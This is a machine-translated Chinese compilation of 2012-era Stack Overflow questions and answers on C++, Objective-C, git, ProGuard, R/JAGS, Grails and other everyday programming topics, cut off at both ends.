问题是程序运行速度明显很快，而且每个时间步都打印得太快：我看不到系统是如何演变的。是否有一些技巧可以减慢输出（或直接减慢程序）？

**编辑**：我在 Mac OS X 10.7 上。我的编译器是 GCC 4.7。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:39:44.713

您可以使用标准 C++ (C++11)：

```
#include <thread>
#include <chrono>
#include <iostream>

int main() {
    while (true) {
        // draw loop
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
} 
```

或者，您可以使用一个库来指定调用绘图函数的时间间隔。OS X 有 Grand Central Dispatch（又名 libdispatch）。使用 GCD，您可以创建一个调度计时器源，以指定的频率调用您的绘图函数。

```
dispatch_source_t timer = dispatch_source_create(
    DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());

dispatch_source_set_timer(timer, DISPATCH_TIME_NOW,
    duration_cast<nanoseconds>(milliseconds(20)).count(),
    duration_cast<nanoseconds>(milliseconds( 5)).count());
// the API is defined to use nanoseconds, but I'd rather work in milliseconds
// so I use std::chrono to do the conversion above

dispatch_source_set_event_handler(timer,
    []{ your_draw_function(); });
// I'm not sure if GCC 4.7 actually supports converting C++11 lambdas to
// Apple's C blocks, or if it even supports blocks. Clang supports this.

dispatch_resume(timer);

dispatch_main(); 
```

[libdispatch 参考](http://developer.apple.com/library/ios/#documentation/Performance/Reference/GCD_libdispatch_Ref/Reference/reference.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:13:10.540

无论您使用什么系统，它都会有某种可以调用的睡眠函数，它将暂停您的程序一段指定的时间。你没有指定你使用什么操作系统，所以我不能给出确切的细节，但这听起来像你正在寻找的方法。

如果您在绘制图像的每次更新后调用 sleep 一段时间，您的程序将在恢复并绘制下一次更新之前休眠该时间。这应该让你有机会真正看到变化

如果您想要更高分辨率的睡眠时间，您可以查看`nanosleep`和`usleep`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:30:46.283

1.你可以使用

```
int tmp; std::cin >> tmp; 
```

并且程序会在您走得更远之前询问您。

2.您可以对一些计算使用循环。像

```
double Tmp[1000000];
for( int i = 0; i < 1000000; i++ )
  Tmp[i] = i;
for( int i = 0; i < 1000000; i++ )
  Tmp[i] = sin(sin(sin(Tmp[i]))); 
```

3.您可以检查您可以使用哪些延迟功能。示例是“睡眠（nSeconds）”[这里](http://www.programmingforums.org/post154167.html)

4.您可以保存并验证您的系统时间。像：

```
 while (time() < time_end){}; 
```

# objective-c - Objective-c 将字符串添加到 html 包

> ID：12078120
> 
> 赞同：0
> 
> 时间：2012-08-22T17:08:38.657
> 
> 标签：objective-c, ios, uiwebview

我搜索了 Stackoverflow 以查看是否已提出此问题，但我的搜索未返回任何相关问题/回复。希望得到帮助（对不起，这个问题已经被问到了）。

这是我的问题： - 我的 iOS 主包中有一个 HTML 文件（即 htmlpage.html） - 在那个 HTML 文件中是各种“%@” - 我有一个 NSString，str，它包含那个值“Rule”

问题：我想将 str 的值加载到 htmlpage.html 中每个出现的 %@ 中。

有谁知道这是否可能？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:19:39.637

您可以使用以下方法替换子字符串。

```
- (NSString *)stringByReplacingOccurrencesOfString:(NSString *)target withString:(NSString *)replacement

//i.e.
myString = [myString stringByReplacingOccurrencesOfString:@"%@" withString:str]; 
```

此外，您可以通过以下方式获取 html 文件的内容：

```
+ (id)stringWithContentsOfFile:(NSString *)path encoding:(NSStringEncoding)enc error:(NSError **)error 
```

# git - 错误：尝试使用不存在的对象编写 ref refs/heads/test

> ID：12078122
> 
> 赞同：0
> 
> 时间：2012-08-22T17:08:41.690
> 
> 标签：git, github

我正在尝试删除我的远程分支。我有三个这样的

**遥控器/原点/测试**

但是它们都不能被删除。我搜索了常见的解决方案，并找到了以下建议：

`git push origin :test`

和

`git push origin test --delete`

通过尝试这些，我得到了这个错误：

> $ git push origin test --delete
> 
> >> 接收推送
> 
> 错误：错误：尝试使用不存在的对象 0000000000000000000000000000000000000000 写入 ref refs/heads/test
> 
> 致命：无法更新 ref 'refs/heads/test'。
> 
> 到 ssh：*存储库*
> 
> ！【远程拒绝】测试（预收钩子拒绝）
> 
> 错误：未能将一些引用推送到“*存储库*”

我希望有人知道如何解决这个问题。谢谢！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T19:40:02.363

```
git push origin :test 
```

删除源远程上的测试分支。您还需要在本地删除分支

```
 git branch -d test 
```

跟随[清理旧的远程 git 分支](https://stackoverflow.com/questions/3184555/cleaning-up-old-remote-git-branches)

# android - Proguard 配置以单独保留一些内部类

> ID：12078132
> 
> 赞同：0
> 
> 时间：2012-08-22T17:09:22.137
> 
> 标签：android, eclipse, proguard

我正在尝试将 Eclipse 中的 proguard.cfg 文件配置为不处理某些内部类（不要重命名类或类成员）。

所以在我的情况下，内部类都在 com.mycorp.android.mapper.APIHelper

我试过这个：

```
-keepclasseswithmembers public class com.mycorp.android.mapper.APIHelper$* 
```

但这似乎不起作用。什么是正确的语法？

**编辑：**我也试过让这些类实现一个空白接口，然后尝试：

```
-keepclasseswithmembers class * implements com.mycorp.android.JSONSerializable {
    *;
} 
```

也没有运气。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-19T01:15:58.330

您需要指定要保留的成员。如果是所有这些，我相信以下应该有效。这不会保留 APIHelper 类本身，只保留内部类及其成员。

```
-keep public class com.mycorp.android.mapper.APIHelper$* {
   *;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:29:57.427

我认为您应该使用`-keep`而不是`-keepclasseswithmembers`（基于[此处](http://proguard.sourceforge.net/index.html#manual/usage.html)的 Proguard 文档）。

# ios - 如何在我的 iPad 中创建 .mp3 文件？

> ID：12078135
> 
> 赞同：1
> 
> 时间：2012-08-22T17:09:36.263
> 
> 标签：ios, mp3

> **可能重复：**
> [录制 mp3 而不是 caf 文件](https://stackoverflow.com/questions/9399019/recording-mp3-instead-of-caf-file)

我想知道是否有人可以帮助我解决我的问题。

我找到了在 iPad 中保存声音的方法。但到目前为止，我只创建了 .caf 文件。我可以创建 .mp3 文件吗？

提前致谢。我附上我的代码：

```
 NSArray *dirPaths;
    NSString *docsDir;

    dirPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    docsDir = [dirPaths objectAtIndex:0];

    NSString *soundFilePath = [docsDir stringByAppendingPathComponent:@"sound.caf"];
    NSURL *soundFileURL = [NSURL fileURLWithPath:soundFilePath];

    NSDictionary *recordSettings = [NSDictionary dictionaryWithObjectsAndKeys:
    [NSNumber numberWithInt:AVAudioQualityMin], AVEncoderAudioQualityKey, [NSNumber numberWithInt:16], AVEncoderBitRateKey, [NSNumber numberWithInt: 2], AVNumberOfChannelsKey, [NSNumber numberWithFloat:44100.0], AVSampleRateKey, nil];

    NSError *error = nil;
    AVAudioRecorder audioRecorder = [[AVAudioRecorder alloc] initWithURL:soundFileURL settings:recordSettings error:&error];

    if (error){
        NSLog(@"error: %@", [error localizedDescription]);
    } else {
        [audioRecorder prepareToRecord];
        [audioRecorder record];
    } 
```

# java - 用于在 NetBeans 中填充 JLabels 的应用程序元信息的 Java 静态类

> ID：12078141
> 
> 赞同：0
> 
> 时间：2012-08-22T17:09:47.933
> 
> 标签：java, user-interface, netbeans, jlabel

在我的应用程序中，我有一个“元”类来存储有关应用程序的信息（例如，版本）。

例如：

```
class AppMetaData {
  public static final String version = "beta2";
  public static final String server = ...
  ...
} 
```

在 NetBeans 中，我的应用程序主框架上有一个 JLabel。我希望从这个 MetaClass 中填充它的值。但是代码是为它自动生成的，我看不出有办法从 MetaData 类的版本字段中动态设置它的值。它要么是手动设置的，要么是从某个文本文件中提取的。

有没有一种简单的方法可以实现我想要的，并且不会被代码生成器覆盖？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:11:49.780

`JLabel`有一个`setText`方法，您应该在一个您确定不会被 IDE 覆盖的地方调用该方法。

# javascript - 如何用 Javascript 编写设备驱动程序？

> ID：12078147
> 
> 赞同：19
> 
> 时间：2012-08-22T17:10:08.887
> 
> 标签：javascript, driver, linux-device-driver, ecmascript-5

是否可以用 Javascript 编写硬件驱动程序？这样的任务需要哪些步骤？

另外，我不确定该在哪里发布，因此也欢迎对此提出任何建议。我希望这是问题的准确位置。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-08-22T17:12:01.570

不，不是。我的意思是，你可以通过编写一些将 Javascript 编译成 C 的东西来实现，但这太疯狂了。有点像试图将勺子用作电锯。

学习 C。这是适合这项工作的工具。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-22T17:17:21.157

哦，天哪。写一个驱动程序`js`？为什么？`C`我的意思是，您可以为or中的某些内容编写一个 javascript 包装器`C++`，但您为什么要这样做呢？设备驱动程序在相当低的级别（硬件级别）与机器通信。Javascript没有。Javascript 是一种网络语言（嗯，主要是）。

正如 Rich Bradshaw 所说，这就像将勺子用作电锯一样。尽管对我来说，这更像是尝试将独木舟用作坦克。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-24T05:30:35.980

哇，这个想法毫无意义，恕我直言，您选择一种编程语言来解决问题或任务，而不是相反。我使用设备驱动程序和操作系统内核相关的东西，但仅仅因为我可以在 CI 中编程，不要使用 C 来执行其他任务，例如我的嵌入式设备的 Linux 管理；相反，我使用高级别的东西，例如 Bash、Perl 或 Python（取决于我的心情 :)）。

为什么对 js 感兴趣？实际上，您应该了解编程语言的内部原理以了解您要实现的目标，并且您还需要知道您的程序将如何与您的操作系统交互以与设备寄存器和中断等进行通信。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-02-28T01:22:19.600

听起来很傻，但现在正在为各种物联网设备做这件事。但在我所见过的所有情况下，设备本身都包含 V8 JS 引擎的修改版本。Mozilla 手机公开了一个硬件访问接口，但它再次不是真正的“真实”设备驱动程序，而是向 JS 公开的骨架 API。

我强烈建议您学习 Object Pascal 或 C/C++，因为它们是唯一适合此类工作的真正“真实”语言。传统上 C 是最常用的语言，但 C 和 Pascal 本质上是相同的东西，但语法不同。C++ builder 和 Object Pascal 甚至共享相同的代码生成器，顶部有不同的解析器/词法分析器。

话虽如此，没有真正的理由可以在 NodeJS 中编写一些自定义驱动程序。在 Linux 下，许多硬件中间件最初是用 Python 编写的，然后才最终用 C 语言编写。所以一切皆有可能，只要有人调整了有关访问硬件的运行时。FreePascal 和 Python 使 Raspberry PI 1-2 上的 GPIO 访问变得轻而易举。但毫无疑问，真正的语言，如 C/C++ 和 Object Pascal 占据了上风。

“真实”的意思是编译成平台的机器代码，而虚幻的意思是像 python 和 javascript 这样的脚本引擎。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-03T07:31:00.623

只要满足以下几个条件，任何语言都可以用来编写设备驱动程序：

1.  直接内存访问。看看这个源代码：

[https://patchwork.kernel.org/patch/8163061/](https://patchwork.kernel.org/patch/8163061/)

作为设备驱动程序，您可能直接访问虚拟内存或物理内存（在 DMA 的情况下），因此需要绕过 MMU 设置的虚拟内存。直接访问虚拟内存意味着您知道虚拟地址，并希望直接读取该地址。

Java 或 Javascript 没有任何语言结构可以直接通过已知地址读取内存。

2.  汇编语言敏感任务：访问硬件经常需要特殊的汇编指令，比如禁用中断，或从一个 CPU 切换到另一个 CPU，或广播 CPU 间消息等。没有 Java 结构可以完成所有这些，甚至 C语。这就是为什么经常需要结合 C + 汇编的原因。但是没有办法将Java和汇编结合起来。

3.  本机与解释语言：所有解释语言都必须通过解释器来执行该语言。在 Javascript 或 Java 中，您需要 JVM 来执行 Java。因此，如果您需要内核中的 Java，那么您将需要内核中的 JVM 解释器。这并非不可能——最近的 Linux 内核在内核中运行了一个 BPF 解释器，因此您在内核中运行了一个 BPF VM：

[https://events.linuxfoundation.org/sites/events/files/slides/bpf_collabsummit_2015feb20.pdf](https://events.linuxfoundation.org/sites/events/files/slides/bpf_collabsummit_2015feb20.pdf)

[https://lwn.net/Articles/599755/](https://lwn.net/Articles/599755/)

Java 作为设备驱动程序的想法之前已经实现，作为研究论文/项目（针对 Sun Solaris OS）：

[http://dl.acm.org/citation.cfm?id=1215998](http://dl.acm.org/citation.cfm?id=1215998)

[http://www.c0t0d0s0.org/archives/2587-Device-driver-in-Java.html](http://www.c0t0d0s0.org/archives/2587-Device-driver-in-Java.html)

但是我不确定直接内存访问的问题是如何解决的。

尽管如此，始终可以设计一个系统，其中部分任务可以由依赖于 C/Assembly 的低级模块和可以用非 C 语言编写的其他组件来完成，如最近的这篇论文所示（使用 2009 年）：

[https://www.usenix.org/legacy/event/usenix09/tech/full_papers/renzelmann/renzelmann_html/](https://www.usenix.org/legacy/event/usenix09/tech/full_papers/renzelmann/renzelmann_html/)

见下图：

[点击查看图片](https://www.usenix.org/legacy/event/usenix09/tech/full_papers/renzelmann/renzelmann_html/figures/arch.png)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-08-03T07:34:27.297

我们遇到了类似的问题，我们需要通过我们的在线平台访问硬件并实时展示它，所以我们的解决方案是购买一个适配器，它为硬件端口提供 IP，这样我们就可以使用 node.js 与它交谈，也许你可以找到类似的解决方案

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-08-26T20:25:45.793

我支持你，伙计。您应该可以自由地用 JavaScript 编写该设备驱动程序。然后，您可以使用[https://github.com/andrei-markeev/ts2c](https://github.com/andrei-markeev/ts2c)之类的工具将其转换为 C。

# delphi - 为什么 Delphi2009+ 中 SizeOf(Char) = 2？

> ID：12078148
> 
> 赞同：5
> 
> 时间：2012-08-22T17:10:09.843
> 
> 标签：delphi, unicode, character-encoding

我想知道：SizeOf(Char) = 2 in never Delphi 版本，但这不足以存储 unicode 表中定义的字符的所有整数映射，对吧？（据我所知，字符数超过 65536）。那么这个问题是如何解决的呢？

也许两个字节用于编码基本多语言平面（BMP）中的所有字符？但是 BMP 之外的字符会发生什么？

有人可以解释一下吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:11:22.537

BMP 之外的字符串使用代理项进行编码，就像在 UTF-16 中一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T23:06:15.240

以前，如果要存储单个字符，可以使用单个 Char (AnsiChar)。但在 Unicode 中，您不应该在 Chars 中存储单个 UTF-16 代码点（在 D2009+ 中是 WideChars），您应该使用字符串，因为它们可以包含单个 Char 以及代理对。

# objective-c - 归档和二进制写入文件系统之间的区别

> ID：12078149
> 
> 赞同：1
> 
> 时间：2012-08-22T17:10:11.420
> 
> 标签：objective-c, file, save, archive

对于这个应用程序，作者通过归档和 UIImages 通过二进制写入文件系统来保存 ivars。做一种方法和另一种方法有什么区别吗？

# r - 如何将 mcmc.list 转换为 bugs 对象？

> ID：12078152
> 
> 赞同：12
> 
> 时间：2012-08-22T17:10:22.683
> 
> 标签：r, jags, winbugs14, winbugs, r2winbugs

我正在使用`rjags`R 库。该函数`coda.samples`产生一个`mcmc.list`，例如（从`example(coda.samples)`）：

```
library(rjags)
data(LINE)
LINE$recompile()
LINE.out <- coda.samples(LINE, c("alpha","beta","sigma"), n.iter=1000)
class(LINE.out)
[1] "mcmc.list" 
```

但是，我想使用`plot.bugs`需要一个`bugs`对象作为输入的函数。

是否可以将一个对象从一个对象转换`mcmc.list`为一个`bugs`对象，这样`plot.bugs(LINE.out)`？

请注意，[在 stats.SE](https://stats.stackexchange.com/q/32462/1381)上有一个类似的问题，一个多月以来一直没有答案。这个问题有一个赏金，于 2012 年 8 月 29 日结束。

### 更多提示：

我发现 R2WinBUGS 包有一个函数“as.bugs.array”函数 - 但不清楚该函数如何应用于 mcmc.list。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-05-06T06:03:09.617

我不知道这是否会给你你想要的。请注意，`model`代码来自使用您的代码，然后`LINE`在光标处键入。其余的只是标准错误代码，除了我用于`tau = rgamma(1,1)`初始值并且不知道它有多标准。我不止一次看到`tau = 1`用作初始值。也许这样会更好。

实际上，我使用您正在使用`rjags`的相同`model`代码创建了一个对象，并添加了一条`jags`语句来运行它。我承认这与将 coda 输出转换为`bugs`对象不同，但它可能会导致您获得所需的`plot`.

如果您所拥有的只是一个`mcmc.list`并且没有`model`代码，而您只是想绘制`mcmc.list`，那么我的回答将无济于事。

```
library(R2jags)

x <- c(1, 2, 2, 4, 4,  5,  5,  6,  6,  8) 
Y <- c(7, 8, 7, 8, 9, 11, 10, 13, 14, 13) 

N <- length(x)
xbar <- mean(x)

summary(lm(Y ~ x))

x2 <- x - xbar

summary(lm(Y ~ x2))

# Specify model in BUGS language

sink("model1.txt")

cat("

model  {
                for( i in 1 : N ) {
                        Y[i] ~ dnorm(mu[i],tau)
                        mu[i] <- alpha + beta * (x[i] - xbar)
                }
                tau ~ dgamma(0.001,0.001) 
                sigma <- 1 / sqrt(tau)
                alpha ~ dnorm(0.0,1.0E-6)
                beta ~ dnorm(0.0,1.0E-6)        
        }

",fill=TRUE)
sink()

win.data <- list(Y=Y, x=x, N=N, xbar=xbar)

# Initial values
inits <- function(){ list(alpha=rnorm(1), beta=rnorm(1), tau = rgamma(1,1))}

# Parameters monitored
params <- c("alpha", "beta", "sigma")

# MCMC settings
ni <- 25000
nt <-     5
nb <-  5000
nc <-     3

out1 <- jags(win.data, inits, params, "model1.txt", n.chains = nc, 
             n.thin = nt, n.iter = ni, n.burnin = nb)

print(out1, dig = 2)
plot(out1)

#library(R2WinBUGS)
#plot(out1) 
```

**编辑：**

根据评论，也许这样的事情会有所帮助。这条线`str(new.data)`表明有大量数据可用。如果您只是尝试创建默认图的变体，那么这样做可能只是根据需要提取和子集数据的问题。这`plot(new.data$sims.list$P1)`只是一个简单的例子。在不确切知道您想要什么情节的情况下，我不会尝试更具体的数据提取。如果您发布一个显示您想要的确切情节示例的图形，也许有人可以从这里获取它并发布创建它所需的代码。

顺便说一句，我建议将示例数据集的大小减少到可能三个链，并且可能不超过 30 次迭代，直到您获得所需的确切代码以获取所需的确切绘图：

```
load("C:/Users/mmiller21/simple R programs/test.mcmc.list.Rdata")

class(test.mcmc.list)

library(R2WinBUGS)

plot(as.bugs.array(sims.array = as.array(test.mcmc.list)))

new.data <- as.bugs.array(sims.array = as.array(test.mcmc.list))

str(new.data)

plot(new.data$sims.list$P1) 
```

**编辑：**

另请注意：

```
class(new.data)
[1] "bugs" 
```

然而：

```
class(test.mcmc.list)
[1] "mcmc.list" 
```

这就是您帖子的标题所要求的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:35:59.970

不是答案，但这篇[博](http://yusung.blogspot.com/2008/02/wraper-function-to-convert-coda-files.html)文具有以下包装函数，用于使用 R2WinBUGS:::bugs.sims 将尾声输出 (.txt) 转换为 BUGS：

```
coda2bugs <- function(path, para, n.chains=3, n.iter=5000, 
                      n.burnin=1000, n.thin=2) {   
 setwd(path)   
 library(R2WinBUGS)   
 fit <- R2WinBUGS:::bugs.sims(para, n.chains=n.chains, 
        n.iter=n.iter, n.burnin=n.burnin, n.thin=n.thin, 
        DIC = FALSE)   
 class(fit) <- "bugs"   
 return(fit) 
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-05-08T06:14:05.160

这不是您问题的解决方案，但为了回应您对@andybega 答案的评论，这是一种将`mcmc.list`对象转换为典型的尾文本文件的方法。

```
mcmc.list.to.coda <- function(x, outdir=tempdir()) {
  # x is an mcmc.list object
  x <- as.array(x)
  lapply(seq_len(dim(x)[3]), function(i) {
    write.table(cbind(rep(seq_len(nrow(x[,,i])), ncol(x)), c(x[,,i])), 
                paste0(outdir, '/coda', i, '.txt'),
                row.names=FALSE, col.names=FALSE)
  })

  cat(paste(colnames(x), 
            1 + (seq_len(ncol(x)) - 1) * nrow(x),
            nrow(x) * seq_len(ncol(x))), 
      sep='\n', 
      file=file.path(outdir, 'codaIndex.txt'))
}

# For example, using the LINE.out from your question:
mcmc.list.to.coda(LINE.out, tempdir()) 
```

# sql - 如何在 Visual Studio 数据工具中格式化 MDX

> ID：12078156
> 
> 赞同：2
> 
> 时间：2012-08-22T17:11:10.730
> 
> 标签：sql, visual-studio, ssas, mdx

有没有办法在 Visual Studio 数据工具中格式化 MDX 查询。我指的是多维数据集浏览器，它允许您针对多维数据集自动生成和创建自己的 MDX 查询。

现在我正在使用[http://mdx.mosha.com/default.aspx](http://mdx.mosha.com/default.aspx)来格式化查询！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2021-02-18T04:42:04.990

[Mosha 在 MDX 上的](https://en.wikipedia.org/wiki/Mosha_Pasumansky)大部分有价值的内容现在都很难找到。

但是，他的 MDX Studio 仍然可以在这里找到： [https ://www.sqlbi.com/tools/mdx-studio/](https://www.sqlbi.com/tools/mdx-studio/)

这也有一个“格式”选项（除了许多有用的东西）

[![在此处输入图像描述](../Images/d06b3459bca3182e70767bc9a652fe5a.png)](https://i.stack.imgur.com/vLSCa.png)

# javascript - FB.login 工作，但弹出不关闭

> ID：12078157
> 
> 赞同：2
> 
> 时间：2012-08-22T17:11:12.057
> 
> 标签：javascript, facebook, login, popup, facebook-javascript-sdk

我从 javascript 函数调用 FB.login ：

```
<a onclick="loggin()">login facebook</a>

function loggin (){ 
FB.login(function(response) {           
   if (response.authResponse) {
     window.location.reload();
   }
 });
} 
```

弹出窗口打开，我可以登录，但弹出登录后没有关闭。该页面在此 url 处保持为空：

[https://www.facebook.com/dialog/permissions.request?_path=permissions.request&app_id=](https://www.facebook.com/dialog/permissions.request?_path=permissions.request&app_id=) ...

我在 Chrome、Firefox 和 Safari 中也有同样的行为。我在端口 80 上运行我的应用程序，并且我的 facebook 应用程序正确配置了正确的 URL。

谁能帮助我？

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T11:41:41.963

Hi I know this is too old but you may try this:

```
function loggin (){ 
FB.login(function(response) {           
   if (response.authResponse) {
     window.location.reload();
     return false;
   }
 });
} 
```

# cygwin - Cygwin shell 致命错误 - prefork：无法创建管道进程

> ID：12078159
> 
> 赞同：1
> 
> 时间：2012-08-22T17:11:20.920
> 
> 标签：cygwin

当我在 Windows XP 中启动 Cygwin shell 时，我收到如下消息流：

```
0 [main] -bash 2920 C:\cygwin\bin\bash.exe: *** fatal error - prefork: couldn't create pipe process trackerWin32 error 161 
```

每当我运行脚本和命令时，我都会收到更多消息。shell 似乎可以在大量错误的情况下工作，但这很烦人。

有什么方法可以找出导致此问题的原因或解决此问题吗？

# jquery - IE8中选择框的奇怪显示错误

> ID：12078160
> 
> 赞同：0
> 
> 时间：2012-08-22T17:11:21.347
> 
> 标签：jquery, internet-explorer

我有一个 ajax 调用，它接收一个邮政编码，在数据库中搜索该邮政编码的城市/县/州选项，然后适当地填充三个选择框。这在 Chrome、Firefox 和 IE9 中运行良好。但在 IE8 中，显示行为异常。选择框的第一批工作没有问题。但是，如果您更改邮政编码，第二个人口将无法正确显示。选择框的 DOM 内容很好，但下拉列表的内容是重新填充之前的内容。但是，如果您选择其中一个选项，则所选值就是所选选项应该是的值。在第二张图片中，“Beverly Hills”应该显示“Washington”，但在选择时，选择框实际上显示“Washington”。您可以使用向上/向下导航选择框，

流程背后的代码基本上是

```
jQuery('[id$=city]').html("");
jQuery.each(output.city, function(id, city) {
    jQuery("[id$=city]").append(jQuery("<option></option>").val(city).html(city.capitalize()));
}); 
```

我已经尝试在 jsFiddle 中重现该问题，但不幸的是我无法做到，而且我无法将您指向发生问题的确切页面，因此我已经包含了正在发生的事情的图片。有任何想法吗？是否有强制刷新或我可以使用的东西？我可以根据需要提供更多信息。

![第一步](../Images/6855de720743fe6290d120949563bac7.png)

![第二步](../Images/ce60be8648603d6358f9810f24dee84c.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T21:28:24.767

我最终不得不恢复通过非 jQuery 将选项添加到选择框。无论出于何种原因，这解决了我遇到的问题。

```
var citySelect = document.getElementById('site.address.city');
jQuery.each(output.city, function(id, city) {
    citySelect.options[citySelect.options.length] = new Option(city.capitalize(), city);
}); 
```

# unit-testing - 如何在 Grails 单元测试中模拟 Java 类？

> ID：12078165
> 
> 赞同：1
> 
> 时间：2012-08-22T17:11:46.317
> 
> 标签：unit-testing, grails, groovy, mocking

我有一个 java 类，我已将其添加到我的 resources.groovy 中，如下所示：

```
import persistentrep.ReasoningXMLLoader;
// Place your Spring DSL code here
beans = {
reasoningXMLLoader(ReasoningXMLLoader)
} 
```

然后我在我的 GrailsS​​ervice 中使用这个类：

```
class XMLService
{
def reasoningXMLLoader

    def someMethod()
    {
        reasoningXMLLoader.doSomething()
    }
} 
```

显然，我想编写一个模拟推理XMLLoader 并将其注入服务的单元测试。我尝试使用 @Mock、MockFor 和 mockFor，但我不断收到*org.codehaus.groovy.grails.exceptions.GrailsConfigurationException：无法添加域类 [class persistentrep.ReasoningXMLLoader]。它不是域！*错误 ：

```
org.codehaus.groovy.grails.exceptions.GrailsConfigurationException: Cannot add Domain class [class persistentrep.ReasoningXMLLoader]. It is not a Domain!
at org.codehaus.groovy.grails.commons.DefaultGrailsApplication.addArtefact(DefaultGrailsApplication.java:916)
at org.codehaus.groovy.grails.commons.DefaultGrailsApplication.addArtefact(DefaultGrailsApplication.java:615)
at org.codehaus.groovy.grails.commons.GrailsApplication$addArtefact.call(Unknown Source)
at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:42)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:108)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:120)
at grails.test.mixin.domain.DomainClassUnitTestMixin.mockDomain(DomainClassUnitTestMixin.groovy:131)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:601)
at org.codehaus.groovy.runtime.callsite.PogoMetaMethodSite$PogoCachedMethodSite.invoke(PogoMetaMethodSite.java:226)
at org.codehaus.groovy.runtime.callsite.PogoMetaMethodSite.callCurrent(PogoMetaMethodSite.java:52)
at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallCurrent(CallSiteArray.java:46)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:133)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:145)
at grails.test.mixin.domain.DomainClassUnitTestMixin.mockDomain(DomainClassUnitTestMixin.groovy:128)
at com.vpundit.www.XMLServiceTests.mockDomain(XMLServiceTests.groovy)
at com.vpundit.www.XMLServiceTests.setUp(XMLServiceTests.groovy)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:601)
at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:45)
at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:42)
at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:27)
at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:30)
at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:263)
at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:68)
at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:47)
at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:30)
at org.junit.runners.ParentRunner.run(ParentRunner.java:300)
at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197) 
```

有没有办法使用 Grails 内置的模拟框架来模拟它，还是我需要使用 Mockito 之类的东西？

注入模拟的最佳方法是什么？是否有一些 Grails 魔法可以为我做到这一点，或者我只是使用暴露的属性 - service.reasoningXMLLoader = mock？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-25T18:16:58.857

我终于设法弄清楚如何做到这一点。我遇到了异常，因为我试图使用 @Mock() 属性，这显然不能用于我想做的事情。

[在阅读了有关使用闭包](http://groovy.codehaus.org/Developer+Testing+using+Closures+instead+of+Mocks)和[MockFor](http://groovy.codehaus.org/Groovy+Mocks)进行模拟的 Groovy 文档之后，该任务实际上非常简单。我早该意识到 Groovy 的文档更适合 Grails 的此类信息

所以这里是如何使用闭包来完成我想做的事情。实际上非常整洁：

```
void testParseXml() {
    String xml = "test string"
